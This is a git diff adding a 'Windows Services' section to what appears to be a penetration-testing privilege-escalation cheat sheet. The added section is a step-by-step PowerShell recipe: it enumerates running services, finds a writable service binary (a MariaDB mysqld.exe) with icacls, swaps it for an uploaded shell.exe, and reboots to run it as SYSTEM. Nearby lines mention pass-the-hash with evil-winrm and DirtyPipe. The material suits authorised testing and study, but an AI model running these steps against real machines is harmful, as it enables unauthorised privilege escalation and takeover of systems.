@@ -10,6 +10,7 @@ Index
 - [SeBackupPrivileges](#SeBackupPrivileges)
     - [Exploit by secrets dump](#Exploit-by-secrets-dump)
 - [Windows.old directory](#Windows.old-directory)
+- [Windows Services](#Windows-Services)
 - [Linux DirtyPipe](#Linux-DirtyPipe)
 - [JDWP Java Debug](#JDWP-Java-Debug)
 
@@ -188,6 +189,32 @@ evil-winrm -i 192.168.1.1 -u Administrator -H 00000000000000000000000000000000
 
 ## Windows.old directory
 TODO
+
+## Windows Services
+Scenario:
+ - Local user can modify service's binary 
+ - Local user can stop/start the service OR reboot the machine
+ - Read *winPEASx64.exe* output
+``` powershell
+# identify the services
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+
+# check the privileges
+icacls "C:\Program Files\MariaDB\bin\mysqld.exe"
+C:\Program Files\MariaDB\bin\mysqld.exe BUILTIN\Users:(R)
+                                        BUILTIN\Users:(I)(M)    ## vulnerable config.
+                                        NT AUTHORITY\SYSTEM:(I)(F)
+                                        BUILTIN\Administrators:(I)(F)
+
+# stop the service
+net stop $SERVICE_NAME
+# change the binary name
+mv "C:\Program Files\MariaDB\bin\mysqld.exe" "C:\Program Files\MariaDB\bin\mysqld.BAK"
+# upload the new binary (ex: shell.exe) and rename it
+mv "C:\Program Files\MariaDB\bin\shell.exe" "C:\Program Files\MariaDB\bin\mysqld.exe"
+# reboot the machime
+shutdown /r /t 0
+```
 
 ## Linux DirtyPipe
 Exploit available on Exploit-DB (https://www.exploit-db.com/exploits/50808)
